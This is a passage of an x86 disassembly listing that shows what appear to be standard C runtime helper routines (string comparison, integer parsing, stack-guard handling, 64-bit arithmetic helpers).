  426b5d:	jmp    0x426b69
  426b5f:	lea    eax,[ebp-0xc]
  426b62:	push   eax
  426b63:	call   0x426e6e
  426b68:	pop    ecx
  426b69:	mov    ecx,DWORD PTR [ebp-0x4]
  426b6c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b6f:	call   0x423f7c
  426b74:	leave  
  426b75:	ret    
  426b76:	push   0x38
  426b78:	push   0x428eb0
  426b7d:	call   0x4238a8
  426b82:	mov    eax,ds:0x45c430
  426b87:	xor    eax,DWORD PTR [ebp+0x4]
  426b8a:	mov    DWORD PTR [ebp-0x1c],eax
  426b8d:	xor    edi,edi
  426b8f:	mov    DWORD PTR [ebp-0x20],edi
  426b92:	mov    DWORD PTR [ebp-0x24],edi
  426b95:	mov    eax,DWORD PTR [ebp+0x14]
  426b98:	mov    ebx,DWORD PTR [eax]
  426b9a:	mov    DWORD PTR [ebp-0x28],ebx
  426b9d:	mov    DWORD PTR [ebp-0x2c],edi
  426ba0:	mov    eax,DWORD PTR [ebp+0x8]
  426ba3:	cmp    eax,DWORD PTR [ebp+0xc]
  426ba6:	je     0x426d1f
  426bac:	lea    ecx,[ebp-0x40]
  426baf:	push   ecx
  426bb0:	push   eax
  426bb1:	mov    esi,DWORD PTR ds:0x4280a4
  426bb7:	call   esi
  426bb9:	test   eax,eax
  426bbb:	je     0x426bdd
  426bbd:	cmp    DWORD PTR [ebp-0x40],0x1
  426bc1:	jne    0x426bdd
  426bc3:	lea    eax,[ebp-0x40]
  426bc6:	push   eax
  426bc7:	push   DWORD PTR [ebp+0xc]
  426bca:	call   esi
  426bcc:	test   eax,eax
  426bce:	je     0x426bdd
  426bd0:	cmp    DWORD PTR [ebp-0x40],0x1
  426bd4:	jne    0x426bdd
  426bd6:	mov    DWORD PTR [ebp-0x2c],0x1
  426bdd:	cmp    DWORD PTR [ebp-0x2c],edi
  426be0:	je     0x426bfc
  426be2:	cmp    ebx,0xffffffff
  426be5:	je     0x426beb
  426be7:	mov    esi,ebx
  426be9:	jmp    0x426bf7
  426beb:	push   DWORD PTR [ebp+0x10]
  426bee:	call   0x423ec0
  426bf3:	pop    ecx
  426bf4:	mov    esi,eax
  426bf6:	inc    esi
  426bf7:	mov    DWORD PTR [ebp-0x44],esi
  426bfa:	jmp    0x426bff
  426bfc:	mov    esi,DWORD PTR [ebp-0x44]
  426bff:	cmp    DWORD PTR [ebp-0x2c],edi
  426c02:	jne    0x426c1e
  426c04:	push   edi
  426c05:	push   edi
  426c06:	push   ebx
  426c07:	push   DWORD PTR [ebp+0x10]
  426c0a:	push   0x1
  426c0c:	push   DWORD PTR [ebp+0x8]
  426c0f:	call   DWORD PTR ds:0x4280d0
  426c15:	mov    esi,eax
  426c17:	mov    DWORD PTR [ebp-0x44],esi
  426c1a:	cmp    esi,edi
  426c1c:	je     0x426c76
  426c1e:	mov    DWORD PTR [ebp-0x4],edi
  426c21:	lea    eax,[esi+esi*1]
  426c24:	add    eax,0x3
  426c27:	and    eax,0xfffffffc
  426c2a:	call   0x423900
  426c2f:	mov    DWORD PTR [ebp-0x18],esp
  426c32:	mov    ebx,esp
  426c34:	mov    DWORD PTR [ebp-0x48],ebx
  426c37:	lea    eax,[esi+esi*1]
  426c3a:	push   eax
  426c3b:	push   edi
  426c3c:	push   ebx
  426c3d:	call   0x4261b0
  426c42:	add    esp,0xc
  426c45:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c49:	jmp    0x426c62
  426c4b:	xor    eax,eax
  426c4d:	inc    eax
  426c4e:	ret    
  426c4f:	mov    esp,DWORD PTR [ebp-0x18]
  426c52:	call   0x426d45
  426c57:	xor    edi,edi
  426c59:	xor    ebx,ebx
  426c5b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c5f:	mov    esi,DWORD PTR [ebp-0x44]
  426c62:	cmp    ebx,edi
  426c64:	jne    0x426c84
  426c66:	push   esi
  426c67:	push   0x2
  426c69:	call   0x4249c8
  426c6e:	pop    ecx
  426c6f:	pop    ecx
  426c70:	mov    ebx,eax
  426c72:	cmp    ebx,edi
  426c74:	jne    0x426c7d
  426c76:	xor    eax,eax
  426c78:	jmp    0x426d31
  426c7d:	mov    DWORD PTR [ebp-0x24],0x1
  426c84:	push   esi
  426c85:	push   ebx
  426c86:	push   DWORD PTR [ebp-0x28]
  426c89:	push   DWORD PTR [ebp+0x10]
  426c8c:	push   0x1
  426c8e:	push   DWORD PTR [ebp+0x8]
  426c91:	call   DWORD PTR ds:0x4280d0
  426c97:	test   eax,eax
  426c99:	je     0x426d22
  426c9f:	cmp    DWORD PTR [ebp+0x18],edi
  426ca2:	je     0x426cc4
  426ca4:	push   edi
  426ca5:	push   edi
  426ca6:	push   DWORD PTR [ebp+0x1c]
  426ca9:	push   DWORD PTR [ebp+0x18]
  426cac:	push   esi
  426cad:	push   ebx
  426cae:	push   edi
  426caf:	push   DWORD PTR [ebp+0xc]
  426cb2:	call   DWORD PTR ds:0x428054
  426cb8:	test   eax,eax
  426cba:	je     0x426d22
  426cbc:	mov    eax,DWORD PTR [ebp+0x18]
  426cbf:	mov    DWORD PTR [ebp-0x20],eax
  426cc2:	jmp    0x426d22
  426cc4:	cmp    DWORD PTR [ebp-0x2c],edi
  426cc7:	jne    0x426cdf
  426cc9:	push   edi
  426cca:	push   edi
  426ccb:	push   edi
  426ccc:	push   edi
  426ccd:	push   esi
  426cce:	push   ebx
  426ccf:	push   edi
  426cd0:	push   DWORD PTR [ebp+0xc]
  426cd3:	call   DWORD PTR ds:0x428054
  426cd9:	mov    esi,eax
  426cdb:	cmp    esi,edi
  426cdd:	je     0x426d22
  426cdf:	push   esi
  426ce0:	push   0x1
  426ce2:	call   0x4249c8
  426ce7:	pop    ecx
  426ce8:	pop    ecx
  426ce9:	mov    DWORD PTR [ebp-0x20],eax
  426cec:	cmp    eax,edi
  426cee:	je     0x426d22
  426cf0:	push   edi
  426cf1:	push   edi
  426cf2:	push   esi
  426cf3:	push   eax
  426cf4:	push   esi
  426cf5:	push   ebx
  426cf6:	push   edi
  426cf7:	push   DWORD PTR [ebp+0xc]
  426cfa:	call   DWORD PTR ds:0x428054
  426d00:	cmp    eax,edi
  426d02:	jne    0x426d12
  426d04:	push   DWORD PTR [ebp-0x20]
  426d07:	call   0x4244ba
  426d0c:	pop    ecx
  426d0d:	mov    DWORD PTR [ebp-0x20],edi
  426d10:	jmp    0x426d22
  426d12:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426d16:	je     0x426d22
  426d18:	mov    ecx,DWORD PTR [ebp+0x14]
  426d1b:	mov    DWORD PTR [ecx],eax
  426d1d:	jmp    0x426d22
  426d1f:	mov    ebx,DWORD PTR [ebp-0x48]
  426d22:	cmp    DWORD PTR [ebp-0x24],edi
  426d25:	je     0x426d2e
  426d27:	push   ebx
  426d28:	call   0x4244ba
  426d2d:	pop    ecx
  426d2e:	mov    eax,DWORD PTR [ebp-0x20]
  426d31:	lea    esp,[ebp-0x54]
  426d34:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d37:	xor    ecx,DWORD PTR [ebp+0x4]
  426d3a:	call   0x423f7c
  426d3f:	call   0x4238e3
  426d44:	ret    
  426d45:	push   ebp
  426d46:	mov    ebp,esp
  426d48:	sub    esp,0x48
  426d4b:	push   ebx
  426d4c:	push   esi
  426d4d:	push   edi
  426d4e:	push   0x4
  426d50:	pop    eax
  426d51:	call   0x423900
  426d56:	mov    ebx,esp
  426d58:	push   0x1c
  426d5a:	lea    eax,[ebp-0x24]
  426d5d:	push   eax
  426d5e:	push   ebx
  426d5f:	call   DWORD PTR ds:0x4280f0
  426d65:	test   eax,eax
  426d67:	je     0x426dda
  426d69:	mov    edi,DWORD PTR [ebp-0x20]
  426d6c:	lea    eax,[ebp-0x48]
  426d6f:	push   eax
  426d70:	call   DWORD PTR ds:0x4280ec
  426d76:	mov    eax,DWORD PTR [ebp-0x44]
  426d79:	lea    esi,[eax-0x1]
  426d7c:	not    esi
  426d7e:	and    esi,ebx
  426d80:	sub    esi,eax
  426d82:	mov    DWORD PTR [ebp-0x4],eax
  426d85:	mov    eax,ds:0x45cac4
  426d8a:	mov    ecx,eax
  426d8c:	dec    ecx
  426d8d:	neg    ecx
  426d8f:	sbb    ecx,ecx
  426d91:	and    ecx,0xffff1000
  426d97:	add    ecx,0x11000
  426d9d:	add    ecx,edi
  426d9f:	cmp    esi,ecx
  426da1:	jb     0x426dda
  426da3:	cmp    eax,0x1
  426da6:	je     0x426df2
  426da8:	mov    ebx,edi
  426daa:	mov    edi,0x1000
  426daf:	push   0x1c
  426db1:	lea    eax,[ebp-0x24]
  426db4:	push   eax
  426db5:	push   ebx
  426db6:	call   DWORD PTR ds:0x4280f0
  426dbc:	test   eax,eax
  426dbe:	je     0x426dda
  426dc0:	add    ebx,DWORD PTR [ebp-0x18]
  426dc3:	test   DWORD PTR [ebp-0x14],edi
  426dc6:	je     0x426daf
  426dc8:	test   BYTE PTR [ebp-0xf],0x1
  426dcc:	mov    ebx,DWORD PTR [ebp-0x24]
  426dcf:	je     0x426dd6
  426dd1:	xor    eax,eax
  426dd3:	inc    eax
  426dd4:	jmp    0x426e0e
  426dd6:	cmp    esi,ebx
  426dd8:	jae    0x426dde
  426dda:	xor    eax,eax
  426ddc:	jmp    0x426e0e
  426dde:	push   0x4
  426de0:	push   edi
  426de1:	push   DWORD PTR [ebp-0x4]
  426de4:	push   ebx
  426de5:	call   DWORD PTR ds:0x4280b0
  426deb:	mov    eax,ds:0x45cac4
  426df0:	jmp    0x426df4
  426df2:	mov    ebx,esi
  426df4:	dec    eax
  426df5:	neg    eax
  426df7:	sbb    eax,eax
  426df9:	and    eax,0x103
  426dfe:	lea    ecx,[ebp-0x8]
  426e01:	push   ecx
  426e02:	inc    eax
  426e03:	push   eax
  426e04:	push   DWORD PTR [ebp-0x4]
  426e07:	push   ebx
  426e08:	call   DWORD PTR ds:0x4280e8
  426e0e:	lea    esp,[ebp-0x54]
  426e11:	pop    edi
  426e12:	pop    esi
  426e13:	pop    ebx
  426e14:	leave  
  426e15:	ret    
  426e16:	int3   
  426e17:	int3   
  426e18:	int3   
  426e19:	int3   
  426e1a:	int3   
  426e1b:	int3   
  426e1c:	int3   
  426e1d:	int3   
  426e1e:	int3   
  426e1f:	int3   
  426e20:	push   ebp
  426e21:	mov    ebp,esp
  426e23:	push   edi
  426e24:	push   esi
  426e25:	push   ebx
  426e26:	mov    esi,DWORD PTR [ebp+0xc]
  426e29:	mov    edi,DWORD PTR [ebp+0x8]
  426e2c:	mov    al,0xff
  426e2e:	mov    edi,edi
  426e30:	or     al,al
  426e32:	je     0x426e66
  426e34:	mov    al,BYTE PTR [esi]
  426e36:	add    esi,0x1
  426e39:	mov    ah,BYTE PTR [edi]
  426e3b:	add    edi,0x1
  426e3e:	cmp    ah,al
  426e40:	je     0x426e30
  426e42:	sub    al,0x41
  426e44:	cmp    al,0x1a
  426e46:	sbb    cl,cl
  426e48:	and    cl,0x20
  426e4b:	add    al,cl
  426e4d:	add    al,0x41
  426e4f:	xchg   al,ah
  426e51:	sub    al,0x41
  426e53:	cmp    al,0x1a
  426e55:	sbb    cl,cl
  426e57:	and    cl,0x20
  426e5a:	add    al,cl
  426e5c:	add    al,0x41
  426e5e:	cmp    al,ah
  426e60:	je     0x426e30
  426e62:	sbb    al,al
  426e64:	sbb    al,0xff
  426e66:	movsx  eax,al
  426e69:	pop    ebx
  426e6a:	pop    esi
  426e6b:	pop    edi
  426e6c:	leave  
  426e6d:	ret    
  426e6e:	push   esi
  426e6f:	push   edi
  426e70:	call   0x42375d
  426e75:	mov    edi,DWORD PTR [eax+0x64]
  426e78:	cmp    edi,DWORD PTR ds:0x45c58c
  426e7e:	je     0x426e87
  426e80:	call   0x424c0f
  426e85:	mov    edi,eax
  426e87:	mov    esi,DWORD PTR [esp+0xc]
  426e8b:	cmp    DWORD PTR [edi+0x28],0x1
  426e8f:	movzx  eax,BYTE PTR [esi]
  426e92:	jle    0x426ea2
  426e94:	push   0x8
  426e96:	push   eax
  426e97:	push   edi
  426e98:	call   0x426ef6
  426e9d:	add    esp,0xc
  426ea0:	jmp    0x426eac
  426ea2:	mov    ecx,DWORD PTR [edi+0x48]
  426ea5:	movzx  eax,BYTE PTR [ecx+eax*2]
  426ea9:	and    eax,0x8
  426eac:	test   eax,eax
  426eae:	je     0x426eb3
  426eb0:	inc    esi
  426eb1:	jmp    0x426e8b
  426eb3:	movzx  ecx,BYTE PTR [esi]
  426eb6:	inc    esi
  426eb7:	cmp    ecx,0x2d
  426eba:	mov    edx,ecx
  426ebc:	je     0x426ec3
  426ebe:	cmp    ecx,0x2b
  426ec1:	jne    0x426ec7
  426ec3:	movzx  ecx,BYTE PTR [esi]
  426ec6:	inc    esi
  426ec7:	xor    eax,eax
  426ec9:	cmp    ecx,0x30
  426ecc:	jl     0x426ed8
  426ece:	cmp    ecx,0x39
  426ed1:	jg     0x426ed8
  426ed3:	sub    ecx,0x30
  426ed6:	jmp    0x426edb
  426ed8:	or     ecx,0xffffffff
  426edb:	cmp    ecx,0xffffffff
  426ede:	je     0x426eec
  426ee0:	lea    eax,[eax+eax*4]
  426ee3:	lea    eax,[ecx+eax*2]
  426ee6:	movzx  ecx,BYTE PTR [esi]
  426ee9:	inc    esi
  426eea:	jmp    0x426ec9
  426eec:	cmp    edx,0x2d
  426eef:	pop    edi
  426ef0:	pop    esi
  426ef1:	jne    0x426ef5
  426ef3:	neg    eax
  426ef5:	ret    
  426ef6:	push   ebp
  426ef7:	mov    ebp,esp
  426ef9:	push   ecx
  426efa:	mov    eax,DWORD PTR [ebp+0xc]
  426efd:	lea    ecx,[eax+0x1]
  426f00:	cmp    ecx,0x100
  426f06:	mov    ecx,DWORD PTR [ebp+0x8]
  426f09:	ja     0x426f14
  426f0b:	mov    ecx,DWORD PTR [ecx+0x48]
  426f0e:	movzx  eax,WORD PTR [ecx+eax*2]
  426f12:	jmp    0x426f68
  426f14:	push   esi
  426f15:	mov    edx,eax
  426f17:	sar    edx,0x8
  426f1a:	push   edi
  426f1b:	mov    edi,DWORD PTR [ecx+0x48]
  426f1e:	movzx  esi,dl
  426f21:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426f26:	pop    edi
  426f27:	pop    esi
  426f28:	je     0x426f39
  426f2a:	and    BYTE PTR [ebp-0x2],0x0
  426f2e:	push   0x2
  426f30:	mov    BYTE PTR [ebp-0x3],al
  426f33:	mov    BYTE PTR [ebp-0x4],dl
  426f36:	pop    eax
  426f37:	jmp    0x426f43
  426f39:	and    BYTE PTR [ebp-0x3],0x0
  426f3d:	mov    BYTE PTR [ebp-0x4],al
  426f40:	xor    eax,eax
  426f42:	inc    eax
  426f43:	push   0x1
  426f45:	push   DWORD PTR [ecx+0x14]
  426f48:	push   DWORD PTR [ecx+0x4]
  426f4b:	lea    ecx,[ebp+0xe]
  426f4e:	push   ecx
  426f4f:	push   eax
  426f50:	lea    eax,[ebp-0x4]
  426f53:	push   eax
  426f54:	push   0x1
  426f56:	call   0x425fd8
  426f5b:	add    esp,0x1c
  426f5e:	test   eax,eax
  426f60:	jne    0x426f64
  426f62:	leave  
  426f63:	ret    
  426f64:	movzx  eax,WORD PTR [ebp+0xe]
  426f68:	and    eax,DWORD PTR [ebp+0x10]
  426f6b:	leave  
  426f6c:	ret    
  426f6d:	int3   
  426f6e:	int3   
  426f6f:	int3   
  426f70:	mov    eax,DWORD PTR [esp+0x8]
  426f74:	mov    ecx,DWORD PTR [esp+0x10]
  426f78:	or     ecx,eax
  426f7a:	mov    ecx,DWORD PTR [esp+0xc]
  426f7e:	jne    0x426f89
  426f80:	mov    eax,DWORD PTR [esp+0x4]
  426f84:	mul    ecx
  426f86:	ret    0x10
  426f89:	push   ebx
  426f8a:	mul    ecx
  426f8c:	mov    ebx,eax
  426f8e:	mov    eax,DWORD PTR [esp+0x8]
  426f92:	mul    DWORD PTR [esp+0x14]
  426f96:	add    ebx,eax
  426f98:	mov    eax,DWORD PTR [esp+0x8]
  426f9c:	mul    ecx
  426f9e:	add    edx,ebx
  426fa0:	pop    ebx
  426fa1:	ret    0x10
  426fa4:	int3   
  426fa5:	int3   
  426fa6:	int3   
  426fa7:	int3   
  426fa8:	int3   
  426fa9:	int3   
  426faa:	int3   
  426fab:	int3   
  426fac:	int3   
  426fad:	int3   
  426fae:	int3   
  426faf:	int3   
  426fb0:	push   ebp
  426fb1:	mov    ebp,esp
  426fb3:	push   edi
  426fb4:	push   esi
  426fb5:	push   ebx
  426fb6:	mov    ecx,DWORD PTR [ebp+0x10]
  426fb9:	or     ecx,ecx
  426fbb:	je     0x42700a
  426fbd:	mov    esi,DWORD PTR [ebp+0x8]
  426fc0:	mov    edi,DWORD PTR [ebp+0xc]
  426fc3:	mov    bh,0x41
  426fc5:	mov    bl,0x5a
  426fc7:	mov    dh,0x20
  426fc9:	lea    ecx,[ecx+0x0]
  426fcc:	mov    ah,BYTE PTR [esi]
  426fce:	or     ah,ah
  426fd0:	mov    al,BYTE PTR [edi]
  426fd2:	je     0x426ffb
  426fd4:	or     al,al
  426fd6:	je     0x426ffb
  426fd8:	add    esi,0x1
  426fdb:	add    edi,0x1
  426fde:	cmp    ah,bh
  426fe0:	jb     0x426fe8
  426fe2:	cmp    ah,bl
  426fe4:	ja     0x426fe8
  426fe6:	add    ah,dh
  426fe8:	cmp    al,bh
  426fea:	jb     0x426ff2
  426fec:	cmp    al,bl
  426fee:	ja     0x426ff2
  426ff0:	add    al,dh
  426ff2:	cmp    ah,al
  426ff4:	jne    0x427001
  426ff6:	sub    ecx,0x1
  426ff9:	jne    0x426fcc
  426ffb:	xor    ecx,ecx
  426ffd:	cmp    ah,al
  426fff:	je     0x42700a
  427001:	mov    ecx,0xffffffff
  427006:	jb     0x42700a
  427008:	neg    ecx
  42700a:	mov    eax,ecx
  42700c:	pop    ebx
  42700d:	pop    esi
  42700e:	pop    edi
  42700f:	leave  
  427010:	ret    
  427011:	int3   
  427012:	int3   
  427013:	int3   
  427014:	int3   
  427015:	int3   
  427016:	int3   
  427017:	int3   
  427018:	int3   
  427019:	int3   
  42701a:	int3   
  42701b:	int3   
  42701c:	int3   
  42701d:	int3   
  42701e:	int3   
  42701f:	int3   
  427020:	push   esi
  427021:	mov    eax,DWORD PTR [esp+0x14]
  427025:	or     eax,eax
  427027:	jne    0x427051
  427029:	mov    ecx,DWORD PTR [esp+0x10]
  42702d:	mov    eax,DWORD PTR [esp+0xc]
  427031:	xor    edx,edx
  427033:	div    ecx
  427035:	mov    ebx,eax
  427037:	mov    eax,DWORD PTR [esp+0x8]
  42703b:	div    ecx
  42703d:	mov    esi,eax
  42703f:	mov    eax,ebx
  427041:	mul    DWORD PTR [esp+0x10]
  427045:	mov    ecx,eax
  427047:	mov    eax,esi
  427049:	mul    DWORD PTR [esp+0x10]
  42704d:	add    edx,ecx
  42704f:	jmp    0x427098
  427051:	mov    ecx,eax
  427053:	mov    ebx,DWORD PTR [esp+0x10]
  427057:	mov    edx,DWORD PTR [esp+0xc]
  42705b:	mov    eax,DWORD PTR [esp+0x8]
  42705f:	shr    ecx,1
  427061:	rcr    ebx,1
  427063:	shr    edx,1
  427065:	rcr    eax,1
  427067:	or     ecx,ecx
  427069:	jne    0x42705f
  42706b:	div    ebx
  42706d:	mov    esi,eax
  42706f:	mul    DWORD PTR [esp+0x14]
  427073:	mov    ecx,eax
  427075:	mov    eax,DWORD PTR [esp+0x10]
  427079:	mul    esi
  42707b:	add    edx,ecx
  42707d:	jb     0x42708d
  42707f:	cmp    edx,DWORD PTR [esp+0xc]
  427083:	ja     0x42708d
  427085:	jb     0x427096
  427087:	cmp    eax,DWORD PTR [esp+0x8]
  42708b:	jbe    0x427096
  42708d:	dec    esi
  42708e:	sub    eax,DWORD PTR [esp+0x10]
  427092:	sbb    edx,DWORD PTR [esp+0x14]
  427096:	xor    ebx,ebx
  427098:	sub    eax,DWORD PTR [esp+0x8]
  42709c:	sbb    edx,DWORD PTR [esp+0xc]
  4270a0:	neg    edx
  4270a2:	neg    eax
  4270a4:	sbb    edx,0x0
  4270a7:	mov    ecx,edx
  4270a9:	mov    edx,ebx
  4270ab:	mov    ebx,ecx
  4270ad:	mov    ecx,eax
  4270af:	mov    eax,esi
  4270b1:	pop    esi
  4270b2:	ret    0x10
  4270b5:	int3   
  4270b6:	int3   
  4270b7:	int3   
  4270b8:	int3   
  4270b9:	int3   
  4270ba:	int3   
  4270bb:	int3   
  4270bc:	int3   
  4270bd:	int3   
  4270be:	int3   
  4270bf:	int3   
  4270c0:	lea    eax,[edx-0x1]
  4270c3:	pop    ebx
  4270c4:	ret    
  4270c5:	lea    esp,[esp+0x0]
  4270cc:	lea    esp,[esp+0x0]
  4270d0:	xor    eax,eax
  4270d2:	mov    al,BYTE PTR [esp+0x8]
  4270d6:	push   ebx
  4270d7:	mov    ebx,eax
  4270d9:	shl    eax,0x8
  4270dc:	mov    edx,DWORD PTR [esp+0x8]
  4270e0:	test   edx,0x3
  4270e6:	je     0x4270fd
  4270e8:	mov    cl,BYTE PTR [edx]
  4270ea:	add    edx,0x1
  4270ed:	cmp    cl,bl
  4270ef:	je     0x4270c0
  4270f1:	test   cl,cl
  4270f3:	je     0x427146
  4270f5:	test   edx,0x3
  4270fb:	jne    0x4270e8
  4270fd:	or     ebx,eax
  4270ff:	push   edi
  427100:	mov    eax,ebx
  427102:	shl    ebx,0x10
  427105:	push   esi
  427106:	or     ebx,eax
  427108:	mov    ecx,DWORD PTR [edx]
  42710a:	mov    edi,0x7efefeff
  42710f:	mov    eax,ecx
  427111:	mov    esi,edi
  427113:	xor    ecx,ebx
  427115:	add    esi,eax
  427117:	add    edi,ecx
  427119:	xor    ecx,0xffffffff
  42711c:	xor    eax,0xffffffff
  42711f:	xor    ecx,edi
  427121:	xor    eax,esi
  427123:	add    edx,0x4
  427126:	and    ecx,0x81010100
  42712c:	jne    0x42714a
  42712e:	and    eax,0x81010100
  427133:	je     0x427108
  427135:	and    eax,0x1010100
  42713a:	jne    0x427144
  42713c:	and    esi,0x80000000
  427142:	jne    0x427108
  427144:	pop    esi
  427145:	pop    edi
  427146:	pop    ebx
  427147:	xor    eax,eax
  427149:	ret    
  42714a:	mov    eax,DWORD PTR [edx-0x4]
  42714d:	cmp    al,bl
  42714f:	je     0x427187
  427151:	test   al,al
  427153:	je     0x427144
  427155:	cmp    ah,bl
  427157:	je     0x427180
  427159:	test   ah,ah
  42715b:	je     0x427144
  42715d:	shr    eax,0x10
  427160:	cmp    al,bl
  427162:	je     0x427179
  427164:	test   al,al
  427166:	je     0x427144
  427168:	cmp    ah,bl
  42716a:	je     0x427172
  42716c:	test   ah,ah
  42716e:	je     0x427144
  427170:	jmp    0x427108
  427172:	pop    esi
  427173:	pop    edi
  427174:	lea    eax,[edx-0x1]
  427177:	pop    ebx
  427178:	ret    
  427179:	lea    eax,[edx-0x2]
  42717c:	pop    esi
  42717d:	pop    edi
  42717e:	pop    ebx
  42717f:	ret    
  427180:	lea    eax,[edx-0x3]
  427183:	pop    esi
  427184:	pop    edi
  427185:	pop    ebx
  427186:	ret    
  427187:	lea    eax,[edx-0x4]
  42718a:	pop    esi
  42718b:	pop    edi
  42718c:	pop    ebx
  42718d:	ret    
  42718e:	jmp    DWORD PTR ds:0x4280e4
